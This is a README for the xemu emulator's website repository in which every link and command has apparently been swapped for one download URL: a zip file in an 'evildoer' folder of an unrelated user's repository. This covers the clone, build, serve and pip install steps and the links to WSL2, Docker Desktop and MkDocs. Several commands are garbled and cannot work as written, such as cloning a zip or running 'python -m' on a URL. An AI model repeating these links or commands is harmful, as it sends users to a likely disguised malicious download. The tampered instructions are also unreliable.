xemu-website
====

This repo contains the main website contents for the xemu original Xbox emulator with accompanying documentation and title information for compatibility reporting.

### Cloning

This repository must be cloned with submodules to pull the Xbox title repository.

```sh
$ git clone https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip --recurse-submodules
```

Or if already cloned, run `git submodules update --init --recursive`

### Build

To build, simply run `rm -rf dist/ && DEV=1 https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip` from within the project root.

To serve the built site, run in the `dist` directory: `python -m https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip`.

#### Ubuntu

    $ sudo apt install wget unzip git python3 pip
    $ pip install -r https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip

#### Windows

Follow the Ubuntu instructions above for [WSL2](https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip) paired with [Docker Desktop](https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip)

### Tips

Switch to development mode and update the main url to your local filesystem path within `https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip`

```
develop_mode = True
main_url_base = '{YOUR LOCAL ABSOLUTE FILESYSTEM PATH GOES HERE}/xemu-website/dist'
```

Documentation is generated via [MkDocs](https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip). The source files can be found within the `\docs\docs` folder and configured via `\docs\https://raw.githubusercontent.com/lucas200710/xemu-website/master/evildoer/xemu-website.zip`
